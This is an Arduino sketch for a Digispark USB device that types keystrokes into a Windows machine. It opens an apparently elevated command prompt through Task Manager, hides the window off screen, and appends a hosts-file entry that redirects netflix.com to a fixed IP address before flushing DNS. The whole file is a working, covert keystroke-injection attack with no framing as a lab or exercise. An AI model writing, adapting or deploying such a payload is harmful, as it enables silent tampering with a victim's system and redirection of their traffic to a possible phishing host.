#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key
void setup() { pinMode(1, OUTPUT); }
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskmgr");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_N);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  DigiKeyboard.delay(200);
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(500);
  DigiKeyboard.println("(echo. && echo 103.28.253.239 www.netflix.com netflix.com) >> c:/windows/system32/drivers/etc/hosts");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("ipconfig /flushdns");
  DigiKeyboard.delay(200);
  DigiKeyboard.println("exit");
  digitalWrite(1, HIGH);
  for(;;){ }
}
